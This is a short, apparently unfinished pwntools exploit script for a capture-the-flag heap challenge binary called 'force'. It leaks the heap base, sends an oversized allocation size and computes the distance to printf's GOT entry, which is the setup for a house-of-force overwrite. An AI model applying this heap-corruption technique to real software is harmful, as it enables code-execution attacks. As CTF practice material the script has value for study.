from pwn import *

p = process('./force')
#p = remote('dets.kro.kr', 30004)
e = ELF('./force')

context.log_level = "debug"

pause()
def malloc(force, content):
	p.sendlineafter('>> ', '1')
	p.sendlineafter('force : ', str(force))
	p.sendafter('exercise name : ', str(content))

def free():
	p.sendlineafter('>> ', '2')

def edit(content):
	p.sendlineafter('>> ', '3')
	p.sendafter('new exercise :', str(content))


malloc(24, 'a')
p.recvuntil('force gained : ')
heap_base = int(p.recv(8),16) - 0x10

log.success('heap base : ' + hex(heap_base))

### force : 9549879464854 
p.sendlineafter('>> ', '1')
p.sendlineafter('force :', '88440737348249600')
#########################

pause()
#edit('a' * 16 + p64(0) +p64(0xFFFFFFFFFFFFE1))

log.info(e.got['printf'] - heap_base)

#malloc(e.got['printf'] - heap_base, 'a' )
pause()


p.interactive()
